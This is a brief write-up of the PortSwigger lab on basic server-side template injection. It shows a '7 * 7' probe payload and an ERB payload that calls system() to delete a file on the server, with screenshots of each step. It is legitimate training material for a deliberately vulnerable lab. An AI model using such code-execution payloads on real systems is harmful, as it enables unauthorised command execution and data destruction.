# Basic server-side template injection
Lab URL :- 

`https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic`

![image](https://user-images.githubusercontent.com/60841283/153749305-388d3578-e656-4168-8866-43bd723ae79c.png)

## Message box

![image](https://user-images.githubusercontent.com/60841283/153749638-83c9bbe2-46cb-41b4-af5e-c1add09e605b.png)

### Request containing message 

![image](https://user-images.githubusercontent.com/60841283/153749699-3253e0d3-cda8-4fd7-aeb2-c5eb830a0257.png)

### Payload 
```html
<%= 7 * 7 %>
```

![image](https://user-images.githubusercontent.com/60841283/153749607-c2d4cc5c-46a4-44bb-b08f-9ae556447a21.png)

#### Deleting the file

```html
<%= system("rm /home/carlos/morale.txt") %>
```

![image](https://user-images.githubusercontent.com/60841283/153749856-bf3674af-85ee-4ebe-8200-8beeb878aed1.png)

Deleted!

![image](https://user-images.githubusercontent.com/60841283/153749878-cb05a710-1382-4408-874a-ffc94e0687c1.png)
